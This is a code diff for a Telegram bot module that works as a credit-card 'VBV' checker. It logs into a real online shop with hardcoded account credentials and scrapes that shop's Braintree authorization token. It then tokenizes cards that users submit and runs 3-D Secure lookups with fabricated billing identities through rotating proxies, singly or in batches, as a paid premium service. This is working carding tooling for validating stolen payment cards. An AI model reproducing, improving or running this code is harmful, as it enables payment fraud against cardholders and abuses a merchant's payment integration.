@@ -1,3 +1,4 @@
+
 import os
 import re
 import time
@@ -8,8 +9,8 @@ import asyncio
 import traceback
 import jwt
 import aiohttp
-import requests
-from pyrogram import Client, filters
+from pyrogram import filters
+from pyrogram.enums import ParseMode
 from fake_useragent import UserAgent
 from EQUROBOT import app
 from config import OWNER_ID
@@ -19,10 +20,11 @@ from EQUROBOT.modules.TOOLS.proxies import proxies
 async def get_bin_info(bin_number):
     url = f"https://bins.antipublic.cc/bins/{bin_number}"
     connector = aiohttp.TCPConnector(ssl=False)
+    proxy_url = await proxies()
 
     async with aiohttp.ClientSession(connector=connector) as session:
         try:
-            async with session.get(url) as response:
+            async with session.get(url, proxy=proxy_url, timeout=15) as response:
                 if response.status == 200:
                     bin_info = await response.json()
                     return (
@@ -41,20 +43,24 @@ async def get_bin_info(bin_number):
 def is_au_valid(au):
     try:
         decoded_au = jwt.decode(au, options={"verify_signature": False})
-        exp = decoded_au.get('exp')
-        return exp and exp > int(time.time())
+        exp = decoded_au.get("exp")
+        if exp:
+            current_time = int(time.time())
+            if exp > current_time:
+                return True
+        return False
     except Exception as e:
         print(f"Error decoding 'au': {str(e)}")
         return False
 
 def load_session_data():
-    if os.path.exists('session_data.json'):
-        with open('session_data.json', 'r') as f:
+    if os.path.exists("session_data.json"):
+        with open("session_data.json", "r") as f:
             return json.load(f)
     return None
 
 def save_session_data(data):
-    with open('session_data.json', 'w') as f:
+    with open("session_data.json", "w") as f:
         json.dump(data, f)
 
 async def check_card(card_info, message):
@@ -69,51 +75,80 @@ async def check_card(card_info, message):
     user = user_agent.random
 
     session_data = load_session_data()
-    if session_data and is_au_valid(session_data.get('au')):
-        au = session_data['au']
+    if session_data and is_au_valid(session_data.get("au")):
+        au = session_data["au"]
+        print("Using cached 'au' value.")
     else:
-        acc = ['sophia534201@promail.fun', 'hunter227312@newmail.online']
+        print("Performing login to obtain new 'au' token...")
+        acc = ["sophia534201@promail.fun", "hunter227312@newmail.online"]
         email = random.choice(acc)
-        r = requests.session()
-        headers = {'user-agent': user}
-        response = r.post('https://hakko.co.uk/my-account/add-payment-method/', headers=headers)
-        
-        nonce_match = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text)
-        if not nonce_match:
-            return "Failed to extract login nonce."
-        
-        nonce = nonce_match.group(1)
-        data = {
-            'username': email,
-            'password': 'qFjbaeWjjGEMz5bU',
-            'woocommerce-login-nonce': nonce,
-            '_wp_http_referer': '/my-account/add-payment-method/',
-            'login': 'Log in',
-        }
-        
-        response = r.post('https://hakko.co.uk/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
-        
-        nonce_matches = re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
-        if not nonce_matches:
-            return "Failed to extract add-payment-method nonce."
-        
-        enc_match = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text)
-        if not enc_match:
-            return "Failed to extract Braintree client token."
-        
-        enc = enc_match.group(1)
-        dec = base64.b64decode(enc).decode('utf-8')
-        au_matches = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
-        if not au_matches:
-            return "Failed to extract authorization fingerprint."
-        
-        au = au_matches[0]
-        save_session_data({'au': au})
+        headers = {"user-agent": user}
+        proxy_url = await proxies()
+        connector = aiohttp.TCPConnector(ssl=False)
+
+        async with aiohttp.ClientSession(headers=headers, connector=connector) as session:
+
+            try:
+                async with session.get(
+                    "https://hakko.co.uk/my-account/add-payment-method/",
+                    proxy=proxy_url,
+                    timeout=15
+                ) as response:
+                    response_text = await response.text()
+                    nonce_match = re.search(
+                        r'name="woocommerce-login-nonce" value="(.*?)"', response_text
+                    )
+                    if not nonce_match:
+                        print("Failed to extract login nonce.")
+                        return "Failed to extract login nonce."
+                    nonce = nonce_match.group(1)
+                    print("Starting Login Extracted ✅", nonce)
+            except Exception as e:
+                print(f"Error during initial GET request: {e}")
+                return "Failed to perform initial request."
+
+            data = {
+                "username": email,
+                "password": "qFjbaeWjjGEMz5bU",
+                "woocommerce-login-nonce": nonce,
+                "_wp_http_referer": "/my-account/add-payment-method/",
+                "login": "Log in",
+            }
+            try:
+                async with session.post(
+                    "https://hakko.co.uk/my-account/add-payment-method/",
+                    data=data,
+                    proxy=proxy_url,
+                    timeout=15
+                ) as response:
+                    response_text = await response.text()
+                    nonce_matches = re.findall(
+                        r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response_text
+                    )
+                    if not nonce_matches:
+                        return "Failed to extract add-payment-method nonce."
+                    nonce = nonce_matches[0]
+                    enc_match = re.search(
+                        r'var wc_braintree_client_token = \["(.*?)"\];', response_text
+                    )
+                    if not enc_match:
+                        return "Failed to extract Braintree client token."
+                    enc = enc_match.group(1)
+                    dec = base64.b64decode(enc).decode("utf-8")
+                    au_matches = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
+                    if not au_matches:
+                        return "Failed to extract authorization fingerprint."
+                    au = au_matches[0]
+                    session_data = {"au": au}
+                    save_session_data(session_data)
+            except Exception as e:
+                print(f"Error during login POST request: {e}")
+                return "Failed to perform login request."
 
     headers = {
         "accept": "*/*",
         "accept-language": "en-US,en;q=0.9",
-        'authorization': f'Bearer {au}',
+        "authorization": f"Bearer {au}",
         "braintree-version": "2018-05-10",
         "content-type": "application/json",
         "origin": "https://assets.braintreegateway.com",
@@ -157,102 +192,107 @@ async def check_card(card_info, message):
 
     try:
         proxy_url = await proxies()
-        response = requests.post(
-            "https://payments.braintree-api.com/graphql",
-            headers=headers,
-            json=json_data,
-            proxies=proxy_url,
-        )
-        response_data = response.json()
+        connector = aiohttp.TCPConnector(ssl=False)
+        async with aiohttp.ClientSession(headers=headers, connector=connector) as session:
 
-        if "errors" in response_data:
-            return f"Failed to tokenize the card. Error details: {response_data.get('errors')}"
+            async with session.post(
+                "https://payments.braintree-api.com/graphql",
+                json=json_data,
+                proxy=proxy_url,
+                timeout=15
+            ) as response:
+                response_data = await response.json()
 
-        token = response_data["data"]["tokenizeCreditCard"]["token"]
-        print("Payment ID Creation ✅", token)
+            if "errors" in response_data:
+                return f"Failed to tokenize the card. Error details: {response_data.get('errors')}"
 
-        lookup_headers = {
-            "accept": "*/*",
-            "accept-language": "en-US,en;q=0.9",
-            "content-type": "application/json",
-            "origin": "https://hakko.co.uk",
-            "priority": "u=1, i",
-            "referer": "https://hakko.co.uk/",
-            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
-            "sec-ch-ua-mobile": "?0",
-            "sec-ch-ua-platform": '"Windows"',
-            "sec-fetch-dest": "empty",
-            "sec-fetch-mode": "cors",
-            "sec-fetch-site": "cross-site",
-            "user-agent": user,
-        }
+            token = response_data["data"]["tokenizeCreditCard"]["token"]
+            print("Payment ID Creation ✅", token)
 
-        lookup_json_data = {
-            "amount": "904.06",
-            "browserColorDepth": 24,
-            "browserJavaEnabled": False,
-            "browserJavascriptEnabled": True,
-            "browserLanguage": "en-US",
-            "browserScreenHeight": 768,
-            "browserScreenWidth": 1366,
-            "browserTimeZone": -330,
-            "deviceChannel": "Browser",
-            "additionalInfo": {
-                "shippingGivenName": "Isabella ",
-                "shippingSurname": "Martin",
-                "ipAddress": "106.208.150.64",
-                "billingLine1": "Dee St",
-                "billingLine2": "",
-                "billingCity": "Banchory",
-                "billingState": "",
-                "billingPostalCode": "AB31 5HS",
-                "billingCountryCode": "GB",
-                "billingPhoneNumber": "01330822625",
-                "billingGivenName": "Isabella ",
-                "billingSurname": "Martin",
-                "shippingLine1": "Dee St",
-                "shippingLine2": "",
-                "shippingCity": "Banchory",
-                "shippingState": "",
-                "shippingPostalCode": "AB31 5HS",
-                "shippingCountryCode": "GB",
-                "email": "n62bqm@qacmjeq.com",
-            },
-            "challengeRequested": True,
-            "bin": cc[:6],
-            "dfReferenceId": "0_d58bc780-01fc-4114-819f-7dddc3e1b0b6",
-            "clientMetadata": {
-                "requestedThreeDSecureVersion": "2",
-                "sdkVersion": "web/3.106.0",
-                "cardinalDeviceDataCollectionTimeElapsed": 1390,
-                "issuerDeviceDataCollectionTimeElapsed": 901,
-                "issuerDeviceDataCollectionResult": True,
-            },
-            "authorizationFingerprint": au,
-            "braintreeLibraryVersion": "braintree/web/3.106.0",
-            "_meta": {
-                "merchantAppId": "hakko.co.uk",
-                "platform": "web",
-                "sdkVersion": "3.106.0",
-                "source": "client",
-                "integration": "custom",
-                "integrationType": "custom",
-                "sessionId": "091fd1d0-67fa-4f18-bfba-642a00b8667c",
-            },
-        }
+            lookup_headers = {
+                "accept": "*/*",
+                "accept-language": "en-US,en;q=0.9",
+                "content-type": "application/json",
+                "origin": "https://hakko.co.uk",
+                "priority": "u=1, i",
+                "referer": "https://hakko.co.uk/",
+                "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
+                "sec-ch-ua-mobile": "?0",
+                "sec-ch-ua-platform": '"Windows"',
+                "sec-fetch-dest": "empty",
+                "sec-fetch-mode": "cors",
+                "sec-fetch-site": "cross-site",
+                "user-agent": user,
+            }
 
-        lookup_response = requests.post(
-            f"https://api.braintreegateway.com/merchants/wcr3cvc237q7jz6b/client_api/v1/payment_methods/{token}/three_d_secure/lookup",
-            headers=lookup_headers,
-            json=lookup_json_data,
-            proxies=proxy_url,
-        )
-        lookup_response_data = lookup_response.json()
-        msg = (
-            lookup_response_data.get("paymentMethod", {})
-            .get("threeDSecureInfo", {})
-            .get("status", "")
-        )
+            lookup_json_data = {
+                "amount": "904.06",
+                "browserColorDepth": 24,
+                "browserJavaEnabled": False,
+                "browserJavascriptEnabled": True,
+                "browserLanguage": "en-US",
+                "browserScreenHeight": 768,
+                "browserScreenWidth": 1366,
+                "browserTimeZone": -330,
+                "deviceChannel": "Browser",
+                "additionalInfo": {
+                    "shippingGivenName": "Isabella ",
+                    "shippingSurname": "Martin",
+                    "ipAddress": "106.208.150.64",
+                    "billingLine1": "Dee St",
+                    "billingLine2": "",
+                    "billingCity": "Banchory",
+                    "billingState": "",
+                    "billingPostalCode": "AB31 5HS",
+                    "billingCountryCode": "GB",
+                    "billingPhoneNumber": "01330822625",
+                    "billingGivenName": "Isabella ",
+                    "billingSurname": "Martin",
+                    "shippingLine1": "Dee St",
+                    "shippingLine2": "",
+                    "shippingCity": "Banchory",
+                    "shippingState": "",
+                    "shippingPostalCode": "AB31 5HS",
+                    "shippingCountryCode": "GB",
+                    "email": "n62bqm@qacmjeq.com",
+                },
+                "challengeRequested": True,
+                "bin": cc[:6],
+                "dfReferenceId": "0_d58bc780-01fc-4114-819f-7dddc3e1b0b6",
+                "clientMetadata": {
+                    "requestedThreeDSecureVersion": "2",
+                    "sdkVersion": "web/3.106.0",
+                    "cardinalDeviceDataCollectionTimeElapsed": 1390,
+                    "issuerDeviceDataCollectionTimeElapsed": 901,
+                    "issuerDeviceDataCollectionResult": True,
+                },
+                "authorizationFingerprint": au,
+                "braintreeLibraryVersion": "braintree/web/3.106.0",
+                "_meta": {
+                    "merchantAppId": "hakko.co.uk",
+                    "platform": "web",
+                    "sdkVersion": "3.106.0",
+                    "source": "client",
+                    "integration": "custom",
+                    "integrationType": "custom",
+                    "sessionId": "091fd1d0-67fa-4f18-bfba-642a00b8667c",
+                },
+            }
+
+            async with session.post(
+                f"https://api.braintreegateway.com/merchants/wcr3cvc237q7jz6b/client_api/v1/payment_methods/{token}/three_d_secure/lookup",
+                json=lookup_json_data,
+                headers=lookup_headers,
+                proxy=proxy_url,
+                timeout=15
+            ) as lookup_response:
+                lookup_response_data = await lookup_response.json()
+
+            msg = (
+                lookup_response_data.get("paymentMethod", {})
+                .get("threeDSecureInfo", {})
+                .get("status", "")
+            )
 
         brand, card_type, level, bank, country, flag = await get_bin_info(cc[:6])
 
@@ -285,7 +325,8 @@ async def check_card(card_info, message):
             resp = "Unexpected response"
 
         execution_time = round(time.time() - start_time, 2)
-        return (
+
+        final_response = (
             f"{status}\n\n"
             f"𝗖𝗮𝗿𝗱 ⇾ `{cc}|{mm}|{yy}|{cvv}`\n"
             f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ 3DS Lookup\n"
@@ -296,11 +337,16 @@ async def check_card(card_info, message):
             f"𝗧𝗶𝗺𝗲 ⇾ {execution_time} **Seconds**\n"
             f"𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ⇾ [{message.from_user.first_name}](tg://user?id={message.from_user.id})"
         )
+
+        return final_response
+
     except Exception as e:
+        error_message = f"An error occurred: {str(e)}\n"
+        error_type = f"Error Type: {type(e).__name__}\n"
         traceback_details = traceback.format_exc()
-        print(traceback_details)
+        full_error = error_message + error_type + traceback_details
         return "An internal error occurred, please try again later."
-    
+
 card_pattern = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")
 
 def extract_card_info(message):
@@ -314,18 +360,20 @@ def extract_card_info(message):
         pass
     return card_info
 
-
-
 @app.on_message(filters.command("vbv", prefixes=[".", "/", "!"]))
 async def vbv_check_handler(client, message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
 
     if not await has_premium_access(message.from_user.id) and message.from_user.id != OWNER_ID:
         return await message.reply_text("You don't have premium access. Contact my owner to purchase premium.")
-
+    
     card_info = extract_card_info(message)
 
     if not card_info or not card_pattern.match(card_info):
-        await message.reply("Please provide valid card details in the format: `card_number|mm|yy|cvv`")
+        await message.reply(
+            "Please provide valid card details in the format: `card_number|mm|yy|cvv`"
+        )
         return
 
     processing_msg = await message.reply("Processing your request...")
@@ -333,45 +381,63 @@ async def vbv_check_handler(client, message):
     try:
         response = await check_card(card_info, message)
         await processing_msg.edit_text(response)
+
+
     except Exception as e:
         await processing_msg.edit_text(f"An error occurred: {str(e)}")
-
+        traceback.print_exc()
 
 @app.on_message(filters.command("mvbv", prefixes=[".", "/", "!"]))
 async def mvbv_check_handler(client, message):
     user_id = message.from_user.id
+    chat_id = message.chat.id
 
     if not await has_premium_access(message.from_user.id) and message.from_user.id != OWNER_ID:
         return await message.reply_text("You don't have premium access. Contact my owner to purchase premium.")
-
+    
     card_text = extract_card_info(message)
 
     if not card_text:
-        await message.reply("Please provide card details in the format:\n`/mvbv card1\ncard2\ncard3`")
+        await message.reply(
+            "Please provide card details in the format:\n`/mvbv card1\ncard2\ncard3`"
+        )
         return
 
-    card_lines = [line.strip() for line in card_text.split('\n') if line.strip()]
+    card_lines = [line.strip() for line in card_text.split("\n") if line.strip()]
 
     if len(card_lines) > 6:
         await message.reply("You can check up to 6 cards at a time.")
         return
 
-    tasks = [
-        check_card(card_info, message)
-        for card_info in card_lines if card_pattern.fullmatch(card_info)
-    ]
-
-    if len(tasks) < len(card_lines):
-        await message.reply("Invalid card format found. Use: `card_number|mm|yy|cvv`")
-        return
+    valid_cards = []
+    for card_info in card_lines:
+        if card_pattern.fullmatch(card_info):
+            valid_cards.append(card_info)
+        else:
+            await message.reply(f"Invalid card format found: `{card_info}`. Use: `card_number|mm|yy|cvv`")
+            return
 
     processing_msg = await message.reply("Processing your request...")
 
-    results = await asyncio.gather(*tasks)
-    combined_results = "𝗠𝗮𝘀𝘀 𝗩𝗕𝗩 𝗟𝗼𝗼𝗸𝘂𝗽\n\n" + "\n\n\n".join(results)
+    tasks = [
+        check_card(card_info, message)
+        for card_info in valid_cards
+    ]
 
-    if len(combined_results) > 4096:
-        for chunk in [combined_results[i:i + 4000] for i in range(0, len(combined_results), 4000)]:
-            await message.reply(chunk)
-    else:
-        await processing_msg.edit_text(combined_results)
+    try:
+        results = await asyncio.gather(*tasks)
+        combined_results = "𝗠𝗮𝘀𝘀 𝗩𝗕𝗩 𝗟𝗼𝗼𝗸𝘂𝗽\n\n" + "\n\n\n".join(results)
+
+        if len(combined_results) > 4096:
+            for chunk in [
+                combined_results[i : i + 4000]
+                for i in range(0, len(combined_results), 4000)
+            ]:
+                await message.reply(chunk)
+        else:
+            await processing_msg.edit_text(combined_results)
+
+
+    except Exception as e:
+        await processing_msg.edit_text(f"An error occurred: {str(e)}")
+        traceback.print_exc()
